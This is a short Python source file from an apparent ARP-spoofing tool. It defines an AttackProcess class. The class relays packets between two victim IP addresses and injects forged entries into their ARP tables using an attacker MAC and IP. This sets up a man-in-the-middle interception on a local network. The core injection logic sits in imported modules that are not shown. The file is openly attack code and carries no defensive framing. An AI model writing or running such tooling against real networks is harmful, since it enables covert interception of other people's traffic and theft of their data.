import pcapy

from ArpInjection import Injector
from ArpInjection.packet_tranferor import PacketTransferor


class AttackProcess(object):
    def __init__(self, network_device, packet_analyzer_factory, packet_builder, addresses_helper):
        self.network_device = network_device
        self.packet_analyzer_factory = packet_analyzer_factory
        self.packet_builder = packet_builder
        self.addresses_helper = addresses_helper

    def initialize_attack(self, first_ip, second_ip, attacker_mac, attacker_ip):
        packet_transferor = PacketTransferor(attacker_ip, attacker_mac, first_ip, second_ip, self.network_device, self.packet_analyzer_factory, self.packet_builder, self.addresses_helper)
        packet_transferor.start_transfer_packets()
        injector = Injector(self.network_device, self.addresses_helper, self.packet_builder)
        injector.inject_entry_to_arp_table(attacker_mac, first_ip, second_ip)

